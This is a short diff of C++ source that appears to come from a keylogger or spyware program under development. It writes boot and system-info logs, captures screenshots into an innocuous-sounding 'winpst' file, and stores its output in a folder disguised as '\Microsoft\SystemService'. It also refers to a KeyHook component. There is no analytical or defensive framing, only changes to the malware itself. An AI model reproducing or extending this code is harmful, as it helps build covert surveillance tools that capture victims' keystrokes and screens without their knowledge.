@@ -8,7 +8,6 @@ int main() {
 #ifdef DEBUG_BUILD
   std::vector<std::filesystem::path>
 	  path = Stream::GetAllFilesInFolder(Stream::GetPath(R"(\Microsoft\SystemService\)"));
-  DEBA(path)
   std::string final = Convert::GetFinalFile(path[0].u8string());
   DEBN(final)
 #endif
@@ -26,7 +25,9 @@ int main() {
 
   Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
   Stream::MakeFile();
-  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
+
+  Stream::WriteLog("[*] BOOT [*]", UserData::GetActiveProcess(), true);
+  Stream::WriteLog("[*] SYS INFO [*]", UserData::GetActiveProcess(), true);
 
   Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
 						"winpst",
